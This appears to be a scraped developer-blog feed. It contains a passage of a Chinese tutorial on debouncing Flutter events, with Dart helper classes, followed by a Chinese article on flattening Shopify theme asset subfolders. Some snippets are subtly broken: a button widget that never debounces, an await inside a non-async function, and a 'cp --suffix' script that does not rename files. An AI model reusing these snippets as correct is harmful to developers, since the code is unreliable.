                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. <strong>常见需要防抖的事件类型</strong></h2>
<h3 data-id="heading-1">a) 用户交互事件</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 按钮点击事件（防止重复提交）</span>
ElevatedButton(
  onPressed: debounce(() {
    <span class="hljs-comment">// 提交表单、跳转页面等</span>
  }),
)

<span class="hljs-comment">// 搜索框输入</span>
TextField(
  onChanged: debounce((value) {
    <span class="hljs-comment">// 搜索请求</span>
  }),
)

<span class="hljs-comment">// 滚动监听</span>
ScrollController().addListener(debounce(() {
  <span class="hljs-comment">// 加载更多</span>
}))
</code></pre>
<h3 data-id="heading-2">b) 系统事件</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 窗口大小变化</span>
Window.onMetricsChanged = debounce(() {
  <span class="hljs-comment">// 重新布局</span>
});

<span class="hljs-comment">// 键盘事件</span>
RawKeyboard.instance.addListener(debounce((event) {
  <span class="hljs-comment">// 键盘处理</span>
}));
</code></pre>
<h2 data-id="heading-3">2. <strong>防抖实现方案</strong></h2>
<h3 data-id="heading-4">方案一：使用现有库</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># pubspec.yaml</span>
<span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">flutter_debounce:</span> <span class="hljs-string">^2.0.0</span>
</code></pre>
<h3 data-id="heading-5">方案二：自定义防抖工具类</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Debouncer</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Duration</span> delay;
  Timer? _timer;
  
  Debouncer({<span class="hljs-keyword">this</span>.delay = <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">500</span>)});
  
  <span class="hljs-keyword">void</span> call(<span class="hljs-keyword">void</span> <span class="hljs-built_in">Function</span>() action) {
    _timer?.cancel();
    _timer = Timer(delay, action);
  }
  
  <span class="hljs-keyword">void</span> dispose() {
    _timer?.cancel();
  }
}

<span class="hljs-comment">// 扩展方法，方便使用</span>
<span class="hljs-keyword">extension</span> FunctionExtensions <span class="hljs-keyword">on</span> <span class="hljs-built_in">Function</span> {
  VoidCallback debounce([<span class="hljs-built_in">Duration</span> delay = <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">300</span>)]) {
    <span class="hljs-keyword">final</span> debouncer = Debouncer(delay: delay);
    <span class="hljs-keyword">return</span> () =&gt; debouncer.call(() =&gt; <span class="hljs-keyword">this</span>());
  }
}
</code></pre>
<h3 data-id="heading-6">方案三：带参数的防抖</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ParamDebouncer</span>&lt;<span class="hljs-title">T</span>&gt; </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Duration</span> delay;
  Timer? _timer;
  <span class="hljs-keyword">void</span> <span class="hljs-built_in">Function</span>(T)? _callback;
  
  ParamDebouncer({<span class="hljs-keyword">this</span>.delay = <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">300</span>)});
  
  <span class="hljs-keyword">void</span> run(T value, <span class="hljs-keyword">void</span> <span class="hljs-built_in">Function</span>(T) callback) {
    _callback = callback;
    _timer?.cancel();
    _timer = Timer(delay, () {
      <span class="hljs-keyword">if</span> (_callback != <span class="hljs-keyword">null</span>) {
        _callback!(value);
      }
    });
  }
  
  <span class="hljs-keyword">void</span> dispose() {
    _timer?.cancel();
  }
}
</code></pre>
<h2 data-id="heading-7">3. <strong>不同类型事件的防抖策略</strong></h2>



































<table><thead><tr><th>事件类型</th><th>推荐防抖时间</th><th>注意事项</th></tr></thead><tbody><tr><td><strong>按钮点击</strong></td><td>300-500ms</td><td>防止重复提交，但要确保用户体验</td></tr><tr><td><strong>搜索输入</strong></td><td>500-800ms</td><td>根据搜索API响应时间调整</td></tr><tr><td><strong>滚动监听</strong></td><td>150-300ms</td><td>避免频繁计算，但要保持流畅性</td></tr><tr><td><strong>窗口调整</strong></td><td>300-500ms</td><td>避免频繁重绘</td></tr><tr><td><strong>手势拖拽</strong></td><td>100-200ms</td><td>保持响应性</td></tr></tbody></table>
<h2 data-id="heading-8">4. <strong>集成到现有项目的步骤</strong></h2>
<h3 data-id="heading-9">步骤1：识别需要防抖的场景</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 检查以下常见场景：</span>
<span class="hljs-comment">// 1. 表单提交按钮</span>
<span class="hljs-comment">// 2. 搜索框实时搜索</span>
<span class="hljs-comment">// 3. 无限滚动加载更多</span>
<span class="hljs-comment">// 4. 复杂的onChanged回调</span>
<span class="hljs-comment">// 5. 频繁触发的事件监听器</span>
</code></pre>
<h3 data-id="heading-10">步骤2：创建防抖包装器</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DebouncedWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> Widget child;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Duration</span> debounceDelay;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">Type</span>, <span class="hljs-built_in">Duration</span>&gt; eventSpecificDelays;
  
  <span class="hljs-keyword">const</span> DebouncedWidget({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.child,
    <span class="hljs-keyword">this</span>.debounceDelay = <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">300</span>),
    <span class="hljs-keyword">this</span>.eventSpecificDelays = <span class="hljs-keyword">const</span> {},
  });
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// 使用InheritedWidget或Provider传递debouncer</span>
    <span class="hljs-keyword">return</span> child;
  }
}
</code></pre>
<h3 data-id="heading-11">步骤3：使用Mixin简化防抖集成</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">mixin</span> DebounceMixin&lt;T <span class="hljs-keyword">extends</span> StatefulWidget&gt; <span class="hljs-keyword">on</span> State&lt;T&gt; {
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, Timer&gt; _timers = {};
  
  <span class="hljs-keyword">void</span> debounce(
    <span class="hljs-built_in">String</span> key,
    VoidCallback callback, {
    <span class="hljs-built_in">Duration</span> delay = <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">300</span>),
  }) {
    _timers[key]?.cancel();
    _timers[key] = Timer(delay, () {
      callback();
      _timers.remove(key);
    });
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    _timers.values.forEach((timer) =&gt; timer.cancel());
    _timers.clear();
    <span class="hljs-keyword">super</span>.dispose();
  }
}
</code></pre>
<h2 data-id="heading-12">5. <strong>实际应用示例</strong></h2>
<h3 data-id="heading-13">示例1：防抖搜索</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SearchPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _SearchPageState createState() =&gt; _SearchPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_SearchPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">SearchPage</span>&gt; </span>{
  <span class="hljs-keyword">final</span> Debouncer _searchDebouncer = Debouncer(
    delay: <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">500</span>),
  );
  <span class="hljs-keyword">final</span> TextEditingController _controller = TextEditingController();
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> TextField(
      controller: _controller,
      onChanged: (value) {
        _searchDebouncer(() {
          _performSearch(value);
        });
      },
    );
  }
  
  <span class="hljs-keyword">void</span> _performSearch(<span class="hljs-built_in">String</span> query) <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// API调用</span>
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    _searchDebouncer.dispose();
    _controller.dispose();
    <span class="hljs-keyword">super</span>.dispose();
  }
}
</code></pre>
<h3 data-id="heading-14">示例2：防抖按钮</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DebouncedButton</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> VoidCallback onPressed;
  <span class="hljs-keyword">final</span> Widget child;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Duration</span> debounceDuration;
  
  <span class="hljs-keyword">const</span> DebouncedButton({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.onPressed,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.child,
    <span class="hljs-keyword">this</span>.debounceDuration = <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">500</span>),
  });
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> ElevatedButton(
      onPressed: () {
        Debouncer(delay: debounceDuration).call(onPressed);
      },
      child: child,
    );
  }
}
</code></pre>
<h2 data-id="heading-15">6. <strong>注意事项</strong></h2>
<ol>
<li>
<p><strong>内存泄漏</strong></p>
<ul>
<li>确保在State的dispose中取消所有Timer</li>
<li>使用<code>cancel</code>而不是<code>dispose</code>（如果Timer不支持dispose）</li>
</ul>
</li>
<li>
<p><strong>用户体验</strong></p>
<ul>
<li>防抖时间不宜过长，否则会感觉卡顿</li>
<li>对于立即反馈的操作（如按钮点击动画）不应使用防抖</li>
</ul>
</li>
<li>
<p><strong>测试</strong></p>
<pre><code class="hljs language-dart" lang="dart">test(<span class="hljs-string">'防抖功能测试'</span>, () <span class="hljs-keyword">async</span> {
  <span class="hljs-built_in">int</span> callCount = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">final</span> debounced = Debouncer(delay: <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">100</span>));
  
  debounced(() =&gt; callCount++);
  debounced(() =&gt; callCount++);
  
  <span class="hljs-keyword">await</span> Future.delayed(<span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">150</span>));
  expect(callCount, <span class="hljs-number">1</span>);
});
</code></pre>
</li>
<li>
<p><strong>配置化</strong></p>
<ul>
<li>通过配置文件管理不同环境的防抖时间</li>
<li>支持开发环境下禁用防抖以便调试</li>
</ul>
</li>
</ol>
<h2 data-id="heading-16">7. <strong>性能监控</strong></h2>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 添加防抖前后的性能对比</span>
<span class="hljs-keyword">void</span> _monitorPerformance() {
  <span class="hljs-keyword">final</span> stopwatch = <span class="hljs-built_in">Stopwatch</span>();
  
  <span class="hljs-comment">// 防抖前</span>
  stopwatch.start();
  <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    _expensiveOperation();
  }
  <span class="hljs-built_in">print</span>(<span class="hljs-string">'防抖前: <span class="hljs-subst">${stopwatch.elapsedMilliseconds}</span>ms'</span>);
  
  <span class="hljs-comment">// 防抖后</span>
  stopwatch.reset();
  <span class="hljs-keyword">final</span> debouncer = Debouncer(delay: <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">10</span>));
  <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    debouncer(() =&gt; _expensiveOperation());
  }
  <span class="hljs-keyword">await</span> Future.delayed(<span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">200</span>));
  <span class="hljs-built_in">print</span>(<span class="hljs-string">'防抖后: <span class="hljs-subst">${stopwatch.elapsedMilliseconds}</span>ms'</span>);
}
</code></pre>
<p>建议先从最影响性能的地方开始添加防抖，逐步扩展到其他事件，同时注意测试不同设备上的表现。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[shopify 从github获取主题文件时，assets文件中的子文件夹未获取到]]></title>    <link>https://juejin.cn/post/7596883689827074111</link>    <guid>https://juejin.cn/post/7596883689827074111</guid>    <pubDate>2026-01-19T12:12:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596883689827074111" data-draft-id="7596926832912531519" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="shopify 从github获取主题文件时，assets文件中的子文件夹未获取到"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-19T12:12:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mrleolg"/> <meta itemprop="url" content="https://juejin.cn/user/4318537403346743"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            shopify 从github获取主题文件时，assets文件中的子文件夹未获取到
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4318537403346743/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mrleolg
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T12:12:05.000Z" title="Mon Jan 19 2026 12:12:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>从 GitHub 同步 Shopify 主题代码时，<code>assets</code> 文件夹下的子文件夹（比如 <code>assets/images/</code>、<code>assets/icons/</code>）没有被同步到 Shopify 店铺，这并非 GitHub 同步的问题，而是 <strong>Shopify 主题系统的底层限制</strong> —— Shopify 不支持 <code>assets</code> 文件夹下的嵌套子文件夹，只会识别 <code>assets</code> 根目录下的文件，子文件夹及其中的内容会被直接忽略。</p>
<h3 data-id="heading-0">一、核心原因：Shopify 对 assets 文件夹的强制规则</h3>
<p>Shopify 主题的 <code>assets</code> 目录是特殊的静态资源目录，有严格限制：</p>
<ul>
<li>✅ 仅识别 <code>assets</code> <strong>根目录</strong> 下的文件（如 <code>assets/banner.jpg</code>、<code>assets/cart-icon.svg</code>）；</li>
<li>❌ 完全忽略 <code>assets</code> 下的所有子文件夹（如 <code>assets/images/</code>、<code>assets/css/</code>、<code>assets/icons/</code>），同步时不会读取这些子文件夹里的任何文件。</li>
</ul>
<p>这就是为什么 GitHub 仓库里有 <code>assets/images/banner.jpg</code>，但同步到 Shopify 后却看不到的原因 —— Shopify 直接跳过了 <code>images</code> 子文件夹。</p>
<h3 data-id="heading-1">二、解决方案：扁平化 assets 结构（唯一可行方案）</h3>
<p>需要调整 GitHub 仓库的文件结构，将子文件夹里的图片 / 文件移到 <code>assets</code> 根目录，并用<strong>命名前缀</strong>区分原分类（比如 <code>images/banner.jpg</code> → <code>banner-image.jpg</code>），具体步骤如下：</p>
<h4 data-id="heading-2">1. 本地调整文件结构</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 进入本地 Shopify 主题目录 </span>
<span class="hljs-built_in">cd</span> /你的本地主题路径 

<span class="hljs-comment"># 2. 将 assets/images 下的文件移到 assets 根目录，并重命名（加前缀区分） </span>
<span class="hljs-built_in">mv</span> assets/images/banner.jpg assets/banner-image.jpg 
<span class="hljs-built_in">mv</span> assets/images/product-card.png assets/product-card-image.png

<span class="hljs-comment"># 3. 删除空的子文件夹（可选） </span>
<span class="hljs-built_in">rm</span> -rf assets/images

</code></pre>
<h4 data-id="heading-3">2. 修正 Liquid 中的图片引用路径</h4>
<pre><code class="hljs language-liquid" lang="liquid">因为文件路径变了，需要同步修改 Liquid 里的 `asset_url` 引用：

&lt;!-- 原错误写法（引用子文件夹） --&gt; 
&lt;img src="{{ 'images/banner.jpg' | asset_url }}" alt="banner"&gt; 

&lt;!-- 新正确写法（扁平化后） --&gt; 
&lt;img src="{{ 'banner-image.jpg' | asset_url }}" alt="banner"&gt;

</code></pre>
<ol start="3">
<li>推送到 GitHub 并重新同步到 Shopify</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 提交文件结构修改到 GitHub </span>
git add assets/ git commit -m <span class="hljs-string">"fix: 扁平化assets文件夹，适配Shopify规则"</span> 
git push origin main 

<span class="hljs-comment"># 2. 用 Shopify CLI 重新同步到店铺（强制覆盖） </span>
shopify theme push --force

</code></pre>
<h4 data-id="heading-4">4. 验证是否同步成功</h4>
<ul>
<li>打开 GitHub 仓库，确认 <code>assets</code> 根目录下有重命名后的图片文件（如 <code>banner-image.jpg</code>）；</li>
<li>进入 Shopify 后台 → 在线商店 → 主题 → 编辑代码 → 左侧 <code>Assets</code> 文件夹，能看到这些文件即同步成功；</li>
<li>刷新店铺页面，图片即可正常显示。</li>
</ul>
<h3 data-id="heading-5">三、进阶优化：保持本地开发的文件夹结构（可选）</h3>
<p>如果本地开发时想保留 <code>assets/images/</code> 等子文件夹（方便分类管理），可通过 <strong>构建脚本</strong> 自动扁平化文件，避免手动重命名：</p>
<ol>
<li>本地创建 <code>scripts/build-assets.sh</code> 脚本：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash </span>
<span class="hljs-comment"># 自动将 assets/*/ 下的文件复制到 assets 根目录，加前缀 </span>
<span class="hljs-built_in">cp</span> assets/images/*.jpg assets/ --suffix=-image 
<span class="hljs-built_in">cp</span> assets/icons/*.svg assets/ --suffix=-icon

</code></pre>
<ol start="2">
<li>开发完成后，先执行脚本扁平化文件，再提交到 GitHub：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 执行脚本 </span>
bash scripts/build-assets.sh 

<span class="hljs-comment"># 提交到 GitHub </span>
git add assets/ 
git commit -m <span class="hljs-string">"build: 扁平化assets文件"</span> 
git push origin main

</code></pre>
<h3 data-id="heading-6">四、关键注意事项</h3>
<ol>
<li><strong>禁止在 assets 建子文件夹</strong>：这是 Shopify 的硬规则，无论通过 GitHub 同步还是手动上传，子文件夹都不会被识别；</li>
<li><strong>命名规范</strong>：扁平化后文件命名用「功能 + 类型 + 后缀」（如 <code>product-card-image.jpg</code>），避免重名；</li>
<li><strong>批量处理</strong>：若有大量子文件夹文件，可批量重命名（如用 Python/Shell 脚本），避免手动操作出错；</li>
<li><strong>第三方工具同步</strong>：若用 Syncify、Gitify 等工具同步，同样遵循此规则 —— 仅同步 assets 根目录文件。</li>
</ol>
<h3 data-id="heading-7">总结</h3>
<ol>
<li>Shopify 不支持 <code>assets</code> 文件夹下的子文件夹，是图片无法同步的核心原因；</li>
<li>唯一解决方案是<strong>扁平化 assets 结构</strong>：将子文件夹文件移到 assets 根目录，用命名前缀区分分类；</li>
<li>修正 Liquid 中的 <code>asset_url</code> 引用路径，重新推送 GitHub 并同步到 Shopify 即可解决图片不显示问题。</li>
